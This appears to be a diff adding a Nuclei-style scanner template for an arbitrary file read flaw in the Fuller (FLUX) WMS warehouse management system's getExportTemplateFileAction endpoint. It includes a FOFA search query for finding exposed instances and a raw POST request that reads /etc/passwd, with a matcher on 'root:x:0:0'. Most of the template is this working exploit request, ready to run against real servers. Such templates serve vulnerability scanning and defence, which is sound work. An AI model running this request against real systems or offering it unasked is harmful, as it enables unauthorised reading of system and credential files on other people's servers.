@@ -1,0 +1,32 @@
+id: fuller-wms-getexporttemplatefileaction-file-read
+
+info:
+  name: "富勒仓储系统 getExportTemplateFileAction 接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境" ||icon_hash="2050995649"
+          富勒WMS仓储管理系统作为企业级仓储管理平台，部署于仓储、物流及供应链等业务场景。
+      该系统getExportTemplateFileAction接口未正确实施输入验证控制，攻击者可通过精心构造的请求绕过输入验证机制，实现对服务器任意文件的非授权访问。
+  tags: 富勒仓储系统
+
+http:
+- raw:
+  - |
+    POST /expcenter/getExportTemplateFileAction HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    dowmLoadUrl=/etc/passwd&fileName=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
